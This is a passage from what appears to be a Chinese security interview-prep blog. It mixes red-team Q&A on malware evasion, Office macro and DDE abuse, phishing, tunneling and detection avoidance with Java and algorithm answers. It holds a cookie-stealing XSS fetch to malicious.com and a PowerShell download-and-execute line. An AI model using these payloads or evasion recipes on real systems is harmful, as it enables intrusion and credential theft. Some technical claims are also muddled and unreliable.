class="string">&#x27;泛解析&#x27;</span> <span class="keyword">if</span> is_wildcard(domain) <span class="keyword">else</span> <span class="string">&#x27;非泛解析&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="木马免杀有哪些方式？哪种方式最有效？"><a href="#木马免杀有哪些方式？哪种方式最有效？" class="headerlink" title="木马免杀有哪些方式？哪种方式最有效？"></a><strong>木马免杀有哪些方式？哪种方式最有效？</strong></h3><p><strong>免杀方式</strong>：</p>
<ol>
<li><strong>代码混淆</strong>：<ul>
<li>变异代码，绕过特征检测。</li>
</ul>
</li>
<li><strong>加壳</strong>：<ul>
<li>使用 <code>Themida</code>、<code>VMProtect</code> 进行保护。</li>
</ul>
</li>
<li><strong>内存加载</strong>：<ul>
<li>不落地文件，直接在内存运行。</li>
</ul>
</li>
</ol>
<p><strong>最有效方式</strong>：</p>
<ul>
<li><strong>内存加载 + 自定义加密 + 多态变种</strong>。</li>
</ul>
<hr>
<h3 id="木马隐藏有哪些？哪种隐藏方式当前最有效？"><a href="#木马隐藏有哪些？哪种隐藏方式当前最有效？" class="headerlink" title="木马隐藏有哪些？哪种隐藏方式当前最有效？"></a><strong>木马隐藏有哪些？哪种隐藏方式当前最有效？</strong></h3><p><strong>常见隐藏方式</strong>：</p>
<ol>
<li><strong>进程注入</strong>：<ul>
<li>注入 <code>explorer.exe</code>，隐藏自身。</li>
</ul>
</li>
<li><strong>Rootkit 技术</strong>：<ul>
<li>Hook <code>kernel</code> 级函数，隐藏进程。</li>
</ul>
</li>
<li><strong>无文件攻击</strong>：<ul>
<li>通过 <code>PowerShell</code> 运行，无落地文件。</li>
</ul>
</li>
</ol>
<p><strong>最有效方式</strong>：</p>
<ul>
<li><strong>无文件 + 内存驻留 + 进程注入</strong>。</li>
</ul>
<hr>
<h3 id="Word-DDE-和-Office-宏有什么优势？"><a href="#Word-DDE-和-Office-宏有什么优势？" class="headerlink" title="Word DDE 和 Office 宏有什么优势？"></a><strong>Word DDE 和 Office 宏有什么优势？</strong></h3><table>
<thead>
<tr>
<th><strong>攻击方式</strong></th>
<th><strong>优势</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>DDE（动态数据交换）</strong></td>
<td>无需启用宏，可自动执行命令</td>
</tr>
<tr>
<td><strong>Office 宏</strong></td>
<td>可执行恶意 VBA 代码，权限较高</td>
</tr>
</tbody></table>
<p><strong>最佳利用</strong>：</p>
<ul>
<li><strong>DDE 可绕过宏限制</strong>，适用于目标防御较弱的环境。</li>
</ul>
<hr>
<h3 id="如何绕过-Office-受保护视图？"><a href="#如何绕过-Office-受保护视图？" class="headerlink" title="如何绕过 Office 受保护视图？"></a><strong>如何绕过 Office 受保护视图？</strong></h3><p><strong>绕过方式</strong>：</p>
<ol>
<li>**使用 <code>LNK</code> 结合 <code>VBA</code>**：<ul>
<li><code>.lnk -&gt; Word 宏 -&gt; PowerShell 执行</code>。</li>
</ul>
</li>
<li><strong>嵌入远程 <code>RTF</code> 文件</strong>：<ul>
<li>触发 <code>OLE</code> 机制绕过安全检测。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="有哪些有效的钓鱼方式？"><a href="#有哪些有效的钓鱼方式？" class="headerlink" title="有哪些有效的钓鱼方式？"></a><strong>有哪些有效的钓鱼方式？</strong></h3><ol>
<li><strong>HTML Smuggling</strong>：<ul>
<li>直接 <code>JS</code> 生成 <code>EXE</code>，绕过下载检测。</li>
</ul>
</li>
<li><strong>OAuth 伪装</strong>：<ul>
<li>假冒 <code>Google/Microsoft</code> 登录，骗取凭据。</li>
</ul>
</li>
<li><strong>智能 DNS 诱导</strong>：<ul>
<li>伪造 <code>Wi-Fi</code> 认证页面，获取凭据。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何绕过-WAF、HIDS、威胁感知？"><a href="#如何绕过-WAF、HIDS、威胁感知？" class="headerlink" title="如何绕过 WAF、HIDS、威胁感知？"></a><strong>如何绕过 WAF、HIDS、威胁感知？</strong></h3><table>
<thead>
<tr>
<th><strong>目标</strong></th>
<th><strong>绕过方式</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>WAF</strong></td>
<td>使用 <code>编码绕过</code>（如 <code>Base64</code>）</td>
</tr>
<tr>
<td><strong>HIDS</strong></td>
<td>代码注入，隐藏进程</td>
</tr>
<tr>
<td><strong>威胁感知</strong></td>
<td>伪装 <code>User-Agent</code>，避免流量特征匹配</td>
</tr>
</tbody></table>
<hr>
<h3 id="如何在禁止出网的机器上访问互联网？"><a href="#如何在禁止出网的机器上访问互联网？" class="headerlink" title="如何在禁止出网的机器上访问互联网？"></a><strong>如何在禁止出网的机器上访问互联网？</strong></h3><p><strong>绕过方式</strong>：</p>
<ol>
<li><strong>DNS 隧道</strong>：<ul>
<li>通过 <code>iodine</code> 将数据封装进 DNS 查询：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -P password my.dnstunnel.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>ICMP 隧道</strong>：<ul>
<li>使用 <code>Ptunnel</code> 通过 ICMP 传输 TCP 流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -c -p 192.168.1.1 -lp 8000 -da target.com -dp 80</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>蓝牙&#x2F;手机热点</strong>：<ul>
<li>利用手机创建热点，物理绕过网络限制。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="ew、frp-差异？"><a href="#ew、frp-差异？" class="headerlink" title="ew、frp 差异？"></a><strong>ew、frp 差异？</strong></h3><table>
<thead>
<tr>
<th><strong>工具</strong></th>
<th><strong>作用</strong></th>
<th><strong>优点</strong></th>
<th><strong>缺点</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>ew</strong></td>
<td>反向代理</td>
<td>轻量级、无依赖</td>
<td>功能较少</td>
</tr>
<tr>
<td><strong>frp</strong></td>
<td>内网穿透</td>
<td>支持 TCP、UDP、HTTP</td>
<td>需要公网服务器</td>
</tr>
</tbody></table>
<hr>
<h3 id="ICMP-如何出网？"><a href="#ICMP-如何出网？" class="headerlink" title="ICMP 如何出网？"></a><strong>ICMP 如何出网？</strong></h3><p><strong>ICMP 隧道方式</strong>：</p>
<ol>
<li>**使用 <code>Ptunnel</code>**：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -c -p 192.168.1.1 -lp 8080 -da google.com -dp 443</span><br></pre></td></tr></table></figure></li>
<li>**使用 <code>icmptx</code>**：<ul>
<li>在封锁 TCP&#x2F;UDP 但允许 ICMP 的环境下进行数据传输。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何利用-XSS-让影响最大化？"><a href="#如何利用-XSS-让影响最大化？" class="headerlink" title="如何利用 XSS 让影响最大化？"></a><strong>如何利用 XSS 让影响最大化？</strong></h3><p><strong>扩大 XSS 影响的方式</strong>：</p>
<ol>
<li><strong>蠕虫化传播</strong>：<ul>
<li>利用 XSS 自动感染更多用户：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://malicious.com/log?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>结合 CSRF</strong>：<ul>
<li>让受害者执行管理员操作：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://victim.com/delete?user=admin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>劫持 <code>WebSocket</code> 连接</strong>：<ul>
<li>控制用户浏览器发送恶意请求。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何全流程最大限度降低被红军发现概率？"><a href="#如何全流程最大限度降低被红军发现概率？" class="headerlink" title="如何全流程最大限度降低被红军发现概率？"></a><strong>如何全流程最大限度降低被红军发现概率？</strong></h3><p><strong>降低被发现的方法</strong>：</p>
<ol>
<li><strong>减少网络异常行为</strong>：<ul>
<li>避免高频端口扫描，使用 <code>slowloris</code> 低速扫描：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,80,443 -T2 target.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>混淆指纹</strong>：<ul>
<li>伪装 <code>User-Agent</code>、<code>TLS Fingerprint</code>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span> https://target.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>避免持久化</strong>：<ul>
<li>使用 <code>fileless</code> 技术，如 <code>PowerShell</code> 直接运行：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://malicious.com/script.ps1&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>**使用 <code>Covert Channel</code>**：<ul>
<li>通过 DNS、ICMP 通道回传数据，避免直接暴露 IP。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="安全开发岗位"><a href="#安全开发岗位" class="headerlink" title="安全开发岗位"></a>安全开发岗位</h2><h3 id="equals-与-的区别"><a href="#equals-与-的区别" class="headerlink" title="equals 与 &#x3D;&#x3D; 的区别"></a><strong>equals 与 &#x3D;&#x3D; 的区别</strong></h3><table>
<thead>
<tr>
<th><strong>运算符&#x2F;方法</strong></th>
<th><strong>比较内容</strong></th>
<th><strong>适用类型</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>==</code></td>
<td>比较 <strong>引用地址</strong>（基本数据类型则比较值）</td>
<td>基本类型、对象引用</td>
</tr>
<tr>
<td><code>equals()</code></td>
<td>比较 <strong>对象内容</strong>（需重写 <code>equals</code> 方法）</td>
<td>仅适用于对象</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(a == b);        <span class="comment">// false （不同对象）</span></span><br><span class="line">System.out.println(a.equals(b));   <span class="comment">// true （内容相同）</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Java-虚拟机区域如何划分？"><a href="#Java-虚拟机区域如何划分？" class="headerlink" title="Java 虚拟机区域如何划分？"></a><strong>Java 虚拟机区域如何划分？</strong></h3><p><strong>JVM 内存结构</strong>：</p>
<ol>
<li><strong>堆（Heap）</strong>：<ul>
<li>存储对象实例，垃圾回收器管理。</li>
</ul>
</li>
<li><strong>方法区（Metaspace）</strong>：<ul>
<li>存储类元信息、常量池。</li>
</ul>
</li>
<li><strong>虚拟机栈（JVM Stack）</strong>：<ul>
<li>线程私有，存储局部变量、方法调用帧。</li>
</ul>
</li>
<li><strong>本地方法栈（Native Stack）</strong>：<ul>
<li>调用 <code>JNI</code> 代码时使用。</li>
</ul>
</li>
<li><strong>程序计数器（PC Register）</strong>：<ul>
<li>记录当前执行的字节码指令。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="方法重载与方法重写的区别"><a href="#方法重载与方法重写的区别" class="headerlink" title="方法重载与方法重写的区别"></a><strong>方法重载与方法重写的区别</strong></h3><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>方法重载（Overloading）</strong></th>
<th><strong>方法重写（Overriding）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>定义</strong></td>
<td>相同方法名，不同参数列表</td>
<td>子类修改父类方法实现</td>
</tr>
<tr>
<td><strong>作用</strong></td>
<td>提供多种调用方式</td>
<td>实现多态</td>
</tr>
<tr>
<td><strong>访问权限</strong></td>
<td>无需与原方法一致</td>
<td>不能降低父类方法权限</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法重载</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtil</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">sum</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> &#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法重写</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Parent&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Child&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="HashMap、HashTable、ConcurrentHashMap-的区别"><a href="#HashMap、HashTable、ConcurrentHashMap-的区别" class="headerlink" title="HashMap、HashTable、ConcurrentHashMap 的区别"></a><strong>HashMap、HashTable、ConcurrentHashMap 的区别</strong></h3><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>HashMap</strong></th>
<th><strong>HashTable</strong></th>
<th><strong>ConcurrentHashMap</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>线程安全</strong></td>
<td>❌ 非线程安全</td>
<td>✅ 线程安全（同步方法）</td>
<td>✅ 线程安全（分段锁）</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>高</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td><strong>是否允许 <code>null</code></strong></td>
<td><code>key/value</code> 都允许</td>
<td><code>key/value</code> 都不允许</td>
<td>仅 <code>value</code> 允许</td>
</tr>
</tbody></table>
<hr>
<h3 id="进程和线程区别，线程间通信有哪些方式？"><a href="#进程和线程区别，线程间通信有哪些方式？" class="headerlink" title="进程和线程区别，线程间通信有哪些方式？"></a><strong>进程和线程区别，线程间通信有哪些方式？</strong></h3><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>进程</strong></th>
<th><strong>线程</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>定义</strong></td>
<td>独立运行的程序实例</td>
<td>进程内的执行单元</td>
</tr>
<tr>
<td><strong>内存共享</strong></td>
<td>❌ 不共享</td>
<td>✅ 共享进程内存</td>
</tr>
<tr>
<td><strong>创建开销</strong></td>
<td>高</td>
<td>低</td>
</tr>
</tbody></table>
<p><strong>线程间通信方式</strong>：</p>
<ol>
<li><strong>共享内存</strong>（<code>volatile</code>、<code>synchronized</code>）</li>
<li><strong>消息队列</strong>（<code>BlockingQueue</code>）</li>
<li><strong>管道通信</strong>（<code>PipedInputStream</code>、<code>PipedOutputStream</code>）</li>
</ol>
<hr>
<h3 id="Java-BIO-NIO-AIO-是什么？适用哪些场景？"><a href="#Java-BIO-NIO-AIO-是什么？适用哪些场景？" class="headerlink" title="Java BIO&#x2F;NIO&#x2F;AIO 是什么？适用哪些场景？"></a><strong>Java BIO&#x2F;NIO&#x2F;AIO 是什么？适用哪些场景？</strong></h3><table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>特点</strong></th>
<th><strong>适用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>BIO（同步阻塞）</strong></td>
<td>一个线程处理一个连接</td>
<td>低并发（如传统 <code>Socket</code>）</td>
</tr>
<tr>
<td><strong>NIO（同步非阻塞）</strong></td>
<td>采用 <code>Selector</code> 监听多连接</td>
<td>高并发（如 <code>Netty</code>）</td>
</tr>
<tr>
<td><strong>AIO（异步非阻塞）</strong></td>
<td><code>OS</code> 回调处理数据</td>
<td>超高并发（如 <code>WebSocket</code>）</td>
</tr>
</tbody></table>
<hr>
<h3 id="挑一个设计模式（工厂、单例、适配器、观察者）进行讲解"><a href="#挑一个设计模式（工厂、单例、适配器、观察者）进行讲解" class="headerlink" title="挑一个设计模式（工厂、单例、适配器、观察者）进行讲解"></a><strong>挑一个设计模式（工厂、单例、适配器、观察者）进行讲解</strong></h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a><strong>单例模式</strong></h4><p><strong>作用</strong>：</p>
<ul>
<li>确保全局仅有一个实例，避免资源浪费。</li>
</ul>
<p><strong>实现方式</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>数据库连接池</strong></li>
<li><strong>日志管理器</strong></li>
</ul>
<hr>
<h3 id="synchronized-如何使用？Object-的-wait、notify-方法有什么作用？"><a href="#synchronized-如何使用？Object-的-wait、notify-方法有什么作用？" class="headerlink" title="synchronized 如何使用？Object 的 wait、notify 方法有什么作用？"></a><strong>synchronized 如何使用？Object 的 wait、notify 方法有什么作用？</strong></h3><p><strong>synchronized 作用</strong>：</p>
<ul>
<li>线程同步，避免数据竞争。</li>
</ul>
<p><strong>wait&#x2F;notify 作用</strong>：</p>
<ul>
<li><code>wait()</code>：线程进入 <strong>等待状态</strong>，释放锁。</li>
<li><code>notify()</code>：唤醒一个等待的线程。</li>
</ul>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WaitNotifyExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">waitMethod</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Waiting...&quot;</span>);</span><br><span class="line">            lock.wait();  <span class="comment">// 线程进入等待</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Notified!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">notifyMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            lock.notify();  <span class="comment">// 唤醒等待的线程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="sleep-和-wait-有什么区别？"><a href="#sleep-和-wait-有什么区别？" class="headerlink" title="sleep() 和 wait() 有什么区别？"></a><strong>sleep() 和 wait() 有什么区别？</strong></h3><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>sleep()</strong></th>
<th><strong>wait()</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>定义</strong></td>
<td>让线程暂停执行</td>
<td>让线程进入等待队列</td>
</tr>
<tr>
<td><strong>是否释放锁</strong></td>
<td>❌ 不释放</td>
<td>✅ 释放</td>
</tr>
<tr>
<td><strong>使用范围</strong></td>
<td>任意地方</td>
<td>只能在 <code>synchronized</code> 代码块</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread.sleep(<span class="number">1000</span>);  <span class="comment">// 线程暂停 1s</span></span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123; lock.wait(); &#125;  <span class="comment">// 释放锁，等待 notify</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="什么是幂等性？一般有什么方式实现？"><a href="#什么是幂等性？一般有什么方式实现？" class="headerlink" title="什么是幂等性？一般有什么方式实现？"></a><strong>什么是幂等性？一般有什么方式实现？</strong></h3><p><strong>定义</strong>：</p>
<ul>
<li><strong>重复执行多次，不影响最终结果</strong>。</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li><strong>基于数据库唯一约束</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> orders(id, <span class="keyword">user</span>, amount) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Alice&#x27;</span>, <span class="number">100</span>) <span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> amount<span class="operator">=</span>amount;</span><br></pre></td></tr></table></figure></li>
<li><strong>使用 <code>Token</code> 机制</strong>：<ul>
<li>避免重复提交：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (redis.exists(requestToken)) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">redis.set(requestToken, <span class="string">&quot;1&quot;</span>, <span class="number">5</span>, TimeUnit.MINUTES);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>幂等接口设计</strong>：<ul>
<li><code>PUT</code> 请求应更新资源，而非创建新资源。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="大文件小内存的排序如何做？"><a href="#大文件小内存的排序如何做？" class="headerlink" title="大文件小内存的排序如何做？"></a><strong>大文件小内存的排序如何做？</strong></h3><p><strong>外部排序（External Sorting）</strong>：</p>
<ol>
<li><strong>分块排序</strong>：<ul>
<li>将大文件拆分成多个小文件（每个可放入内存）。</li>
<li>使用 <code>快速排序</code> 或 <code>归并排序</code> 对小文件排序。</li>
</ul>
</li>
<li><strong>多路归并（K-Way Merge）</strong>：<ul>
<li>归并排序后的小文件，利用 <strong>最小堆</strong> 进行合并：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sorted_part1.txt&quot;</span>) <span class="keyword">as</span> f1, <span class="built_in">open</span>(<span class="string">&quot;sorted_part2.txt&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    merged = heapq.merge(f1, f2)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;final_sorted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> merged:</span><br><span class="line">            out.write(line)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p><strong>适用算法</strong>：</p>
<ul>
<li><strong>归并排序（Merge Sort）</strong>，适合大文件分块处理。</li>
<li><strong>基数排序（Radix Sort）</strong>，适合整数排序。</li>
</ul>
<hr>
<h3 id="有-1-亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。"><a href="#有-1-亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。" class="headerlink" title="有 1 亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。"></a><strong>有 1 亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。</strong></h3><p><strong>解法 1：位图法（BitMap）</strong>（空间 O(N&#x2F;8)，时间 O(N)）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bit_array = [<span class="number">0</span>] * (<span class="number">10</span>**<span class="number">8</span> // <span class="number">8</span>)  <span class="comment"># 每个 bit 代表一个数</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">    index, offset = <span class="built_in">divmod</span>(num, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> (bit_array[index] &gt;&gt; offset) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;重复数字:&quot;</span>, num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bit_array[index] |= (<span class="number">1</span> &lt;&lt; offset)</span><br></pre></td></tr></table></figure>
<p><strong>解法 2：哈希集合</strong>（空间 O(N)，时间 O(N)）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seen = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> seen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;重复数字:&quot;</span>, num)</span><br><span class="line">    seen.add(num)</span><br></pre></td></tr></table></figure>
<p><strong>解法 3：排序 + 相邻比较</strong>（空间 O(1)，时间 O(N log N)）</p>
<ul>
<li>使用外部排序（归并&#x2F;快速排序），然后遍历找相同数字。</li>
</ul>
<hr>
<h3 id="1-亿个随机生成的无序整数，找出中间大小的值。"><a href="#1-亿个随机生成的无序整数，找出中间大小的值。" class="headerlink" title="1 亿个随机生成的无序整数，找出中间大小的值。"></a><strong>1 亿个随机生成的无序整数，找出中间大小的值。</strong></h3><p><strong>解法 1：快速选择（QuickSelect，O(N)）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">arr, left, right</span>):</span><br><span class="line">    pivot = arr[right]</span><br><span class="line">    i = left</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(left, right):</span><br><span class="line">        <span class="keyword">if</span> arr[j] &lt; pivot:</span><br><span class="line">            arr[i], arr[j] = arr[j], arr[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    arr[i], 